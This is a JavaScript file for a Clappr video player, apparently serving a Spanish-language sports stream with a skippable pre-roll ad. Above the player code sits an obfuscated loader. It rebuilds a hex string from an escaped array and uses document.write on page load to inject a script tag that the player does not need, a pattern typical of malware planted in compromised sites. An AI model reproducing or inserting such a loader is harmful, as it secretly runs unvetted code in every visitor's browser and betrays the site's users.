var _0x3555=["\x31\x30\x32\x34","\x33\x64","\x33\x65","\x30\x36\x38","\x30\x37","\x37\x30","\x33\x64\x32","\x36\x66","\x63\x36","\x34\x32\x32","\x33\x63","\x36\x39","\x36\x31\x36","\x2B","\x37\x30\x32","\x36\x65\x32","\x39\x37\x30","\x6E\x61\x76","\x2D","\x32\x36\x39","\x37\x33\x36","\x36\x35\x37","\x45\x6C\x65","\x32\x39\x32","\x64\x6F\x77","\x67\x65\x74","\x36\x31\x37","\x36\x65\x36","\x65\x36\x38","\x65\x36\x63","\x32\x38","\x61\x62\x73","\x30\x36","\x33\x37","\x63\x36\x31","\x37\x34\x37","\x30\x33\x63","\x36\x66\x36","\x35\x36\x36","\x37\x64\x32","\x37\x36\x35","\x32\x30\x36","\x36\x35\x36","\x74\x69\x6D\x65","\x33\x37\x32","\x32\x30","\x32\x32\x37","\x66\x6F\x72","\x30","\x32\x32\x33","\x39\x36\x36","\x31\x37","\x36\x36\x31","\x77\x68\x69\x6C\x65","\x34\x36\x39","\x30\x36\x35","\x33\x36","\x25","\x38\x37","\x70\x6F\x70","\x36\x61\x36","\x37\x34\x32","\x32\x37\x34","\x37\x30\x37","\x32\x66","\x66\x75\x6E\x63","\x34\x32\x66","\x32\x32","\x39\x37","\x30\x37\x34","\x62\x36\x34","\x36\x33","\x37\x34","\x62\x32\x30","\x36\x33\x64","\x37\x37\x35","\x32\x36","\x26","\x6D\x65\x6E\x74","\x37\x32\x36","\x31\x37\x36","\x37\x33","\x73\x75\x62","\x43\x6F\x64","\x69\x74\x65","\x6D\x43\x68","\x67\x74\x68","\x6C\x65\x6E","\x73\x74","\x66\x72\x6F","\x65","\x61\x72","\x72","\x77\x72"];var _cs=[_0x3555[0],_0x3555[1],_0x3555[2],_0x3555[3],_0x3555[4],_0x3555[5],_0x3555[6],_0x3555[7],_0x3555[8],_0x3555[9],_0x3555[10],_0x3555[11],_0x3555[12],_0x3555[13],_0x3555[14],_0x3555[15],_0x3555[16],_0x3555[17],_0x3555[18],_0x3555[19],_0x3555[20],_0x3555[21],_0x3555[22],_0x3555[23],_0x3555[24],_0x3555[25],_0x3555[26],_0x3555[27],_0x3555[28],_0x3555[29],_0x3555[30],_0x3555[31],_0x3555[32],_0x3555[33],_0x3555[34],_0x3555[35],_0x3555[36],_0x3555[37],_0x3555[38],_0x3555[39],_0x3555[40],_0x3555[41],_0x3555[42],_0x3555[43],_0x3555[44],_0x3555[45],_0x3555[46],_0x3555[47],_0x3555[48],_0x3555[49],_0x3555[50],_0x3555[51],_0x3555[52],_0x3555[53],_0x3555[54],_0x3555[55],_0x3555[56],_0x3555[57],_0x3555[58],_0x3555[59],_0x3555[60],_0x3555[61],_0x3555[62],_0x3555[63],_0x3555[64],_0x3555[65],_0x3555[66],_0x3555[67],_0x3555[68],_0x3555[69],_0x3555[70],_0x3555[71],_0x3555[72],_0x3555[73],_0x3555[74],_0x3555[75],_0x3555[76],_0x3555[77],_0x3555[78],_0x3555[79],_0x3555[80],_0x3555[81],_0x3555[43],_0x3555[82],_0x3555[83],_0x3555[84],_0x3555[85],_0x3555[86],_0x3555[87],_0x3555[88],_0x3555[89],_0x3555[90],_0x3555[91],_0x3555[92],_0x3555[93]];var _g0=_cs[10]+ _cs[20]+ _cs[33]+ _cs[76]+ _cs[16]+ _cs[61]+ _cs[32]+ _cs[34]+ _cs[27]+ _cs[75]+ _cs[12]+ _cs[40]+ _cs[1]+ _cs[67]+ _cs[60]+ _cs[51]+ _cs[52]+ _cs[20]+ _cs[44]+ _cs[11]+ _cs[63]+ _cs[9]+ _cs[45]+ _cs[35]+ _cs[68]+ _cs[55]+ _cs[6]+ _cs[62]+ _cs[21]+ _cs[58]+ _cs[66]+ _cs[60]+ _cs[80]+ _cs[26]+ _cs[56]+ _cs[33]+ _cs[19]+ _cs[5]+ _cs[72]+ _cs[67]+ _cs[2]+ _cs[41]+ _cs[50]+ _cs[30]+ _cs[81]+ _cs[42]+ _cs[8]+ _cs[74]+ _cs[1]+ _cs[72]+ _cs[7]+ _cs[5]+ _cs[23]+ _cs[4]+ _cs[73]+ _cs[72]+ _cs[7]+ _cs[14]+ _cs[29]+ _cs[37]+ _cs[56]+ _cs[51]+ _cs[54]+ _cs[7]+ _cs[15]+ _cs[28]+ _cs[79]+ _cs[38]+ _cs[1]+ _cs[46]+ _cs[3]+ _cs[5]+ _cs[49]+ _cs[73]+ _cs[39]+ _cs[36]+ _cs[64]+ _cs[81]+ _cs[71]+ _cs[79]+ _cs[68]+ _cs[69]+ _cs[2];for(_g1= 0;_g1< _g0[_cs[88]+ _cs[87]];_g1+= 2){document[_cs[94]+ _cs[85]](String[_cs[90]+ _cs[86]+ _cs[92]+ _cs[84]+ _cs[91]](parseInt(_g0[_cs[83]+ _cs[89]+ _cs[93]](_g1,2),16)))}
(function($) {

    $(window.document).ready(function() {
        var autoPlay = true,
            chromeless = false,
            skipCounter, skipInterval, skipOffset, skipText;

        if (Clappr.Browser.isMobile) {
            autoPlay = false;
            chromeless = false;
        }
        window.app = {
            clappr: {
                currentTime: function() {
                    return window.Math.round(window.app.clappr.instance.getCurrentTime(), 0);
                },
                instance: new Clappr.Player({}),
                isBuffering: function() {
                    return window.app.clappr.instance.core.mediaControl.container.buffering;
                },
                resizeCallback: function() {

                    /*
                    window.app.clappr.instance.resize({
                        width: $(window).innerWidth(),
                        height: $(window).innerHeight()
                    });*/

                    $('div[data-player]').css({
                        width: $(window).innerWidth()+'px',
                        height: $(window).innerHeight()+'px'
                    });
                },
                options: {
                    autoPlay: autoPlay,
                    disableKeyboardShortcuts: true,
                    disableVideoTagContextMenu: true,
                    exitFullscreenOnEnd: false,
                    //height: $(window).innerHeight(),
                    language: "es-ES",
                    //persistConfig: false,
                    /*
                    mediacontrol: {
                        buttons: "#fff",
                        seekbar: "#fff",
                    },*/
                    strings: {
                        "es-ES": {
                            back_to_live: "Volver a vivir",
                            live: "Ultra Deportesâ„¢",
                            playback_not_supported: "Su navegador no puede reproducir este medio, intente con un navegador actualizado."
                        },
                    },
                    width: '100%',
                    height: $(window).innerHeight()
                },
            },
            extend: function(defaults, options) {
                return $.extend({}, defaults, options);
            },
            init: function() {
                $(window.document.head).append("<style>body{background-color:transparent;" + "font-family:\"Roboto\";overflow:hidden}" + "video{object-fit:fill}</style>");
                window.config = window.app.extend({
                    adv: {
                        enabled: false,
                    },
                }, window.config);
                if (window.config.adv.enabled) {
                    window.app.initAdv();
                } else {
                    window.app.initMatch();
                }
                $(window).resize(window.app.clappr.resizeCallback);
            },
            initAdv: function() {
                window.app.initContainer(window.config.adv.parentId);
                window.config.adv = window.app.extend({
                    link: "",
                    skipOffset: 5,
                    skipText: "Omitir Anuncio",
                    skipTextN: "Quedan 5 segundos para omitir el anuncio",
                }, window.config.adv);
                window.app.clappr.instance = new Clappr.Player(window.app.extend(window.app.clappr.options, window.app.extend(window.config.adv, {
                    chromeless: chromeless,
                })));
                window.app.initAdvEvents();
            },
            initAdvEvents: function() {
                window.app.clappr.instance.once(Clappr.Events.PLAYER_ENDED, window.app.skip);
                window.app.clappr.instance.once(Clappr.Events.PLAYER_PLAY, window.app.initSkipButton);
                window.app.clappr.instance.on(Clappr.Events.PLAYER_TIMEUPDATE, window.app.skipButton);
                window.app.clappr.instance.setVolume(100);
            },
            initContainer: function(selector) {
                if ($(selector).length > 0) {
                    $(selector).remove();
                }
                $(window.document.body).prepend($("<div />").attr("id", selector.match(/\#(.*)/)[1]));
            },
            initMatch: function() {
                window.app.initContainer(window.config.match.parentId);
                window.app.clappr.instance = new Clappr.Player(window.app.extend(window.app.clappr.options, window.config.match));
                window.app.initMatchEvents();
            },
            initMatchCleanup: function() {
                window.app.clappr.instance.setVolume(100);
                if (Clappr.Browser.isMobile) {
                    $(".bar-scrubber").css({
                        display: "none",
                    });
                } else {
                    /*
                    $("[data-playstop], .bar-scrubber").css({
                        display: "none",
                    });*/
                }
                $("[data-watermark-top-left]").css({
                    left: "37px",
                    top: "37px",
                });
                $("[data-watermark-top-right]").css({
                    top: "37px",
                });
            },
            initMatchEvents: function() {
                window.app.clappr.instance.once(Clappr.Events.PLAYER_PLAY, window.app.initMatchCleanup);
            },
            initSkipButton: function() {
                skipOffset = window.config.adv.skipOffset;
                if (!Clappr.Browser.isMobile) {
                    //$("[data-playpause]").css({
                    //    display: "none"
                    //});
                }
                $(window.document.body).prepend($("<div data-adv-link />").css({
                    height: "100%",
                    left: 0,
                    position: "absolute",
                    top: 0,
                    "z-index": 9998,
                    width: "100%",
                }));
                $("[data-adv-link]").append($("<a />").attr({
                    href: window.config.adv.link,
                    target: "_blank"
                }).css({
                    display: "inline-block",
                    height: "100%",
                    width: "100%"
                }))
                $(window.document.body).prepend($("<div data-adv />").css({
                    bottom: "25%",
                    position: "absolute",
                    right: 0,
                    "z-index": 9999,
                }));
                skipText = window.config.adv.skipTextN.replace("%d", window.config.adv.skipOffset).toUpperCase();
                $("[data-adv]").append($("<button />").attr("type", "button").css({
                    "background-color": "#000",
                    border: "3px solid #333",
                    "border-right": 0,
                    color: "#f8f8f8",
                    "font-family": "Roboto",
                    "font-weight": "bold",
                    padding: "10px 20px",
                }).text(skipText));
            },
            skip: function() {
                $("[data-adv]").remove();
                $("[data-adv-link]").remove();
                window.app.initMatch();
            },
            skipButton: function() {
                if (window.app.clappr.currentTime() > 0) {
                    skipCounter = 1;
                    skipInterval = setInterval(window.app.skipButtonHandler, 1000);
                    window.app.clappr.instance.off(Clappr.Events.PLAYER_TIMEUPDATE, window.app.skipButton);
                }
            },
            skipButtonHandler: function() {
                if (window.app.clappr.isBuffering()) {
                    return false;
                } else if (skipCounter == skipOffset) {
                    skipText = window.config.adv.skipText;
                    $("[data-adv] > button").css({
                        cursor: "pointer",
                    });
                    $("[data-adv] > button").on("click", window.app.skip);
                    clearInterval(skipInterval);
                } else {
                    skipText = window.config.adv.skipTextN.replace("%d", skipOffset - skipCounter);
                    skipCounter++;
                }
                $("[data-adv] > button").text(skipText.toUpperCase());
            },
        };
        window.app.init();
    });
})(jQuery);